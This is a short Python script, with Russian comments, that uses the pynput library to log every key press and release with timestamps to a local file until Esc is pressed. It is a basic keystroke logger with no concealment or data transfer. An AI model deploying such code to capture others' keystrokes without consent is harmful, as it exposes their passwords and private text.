from pynput import keyboard
from datetime import datetime

# имя файла лога
LOG_FILE = "log.txt"

# функция для записи текста в лог
def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def on_press(key):
    try:
        write_log(f"{datetime.now()} - Key pressed: {key.char}")
    except AttributeError:
        write_log(f"{datetime.now()} - Special key pressed: {key}")

def on_release(key):
    write_log(f"{datetime.now()} - Key released: {key}")
    if key == keyboard.Key.esc:
        write_log(f"{datetime.now()} - Program stopped.")
        return False  # завершение программы при нажатии Esc

if __name__ == "__main__":
    write_log(f"Program started at {datetime.now()}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
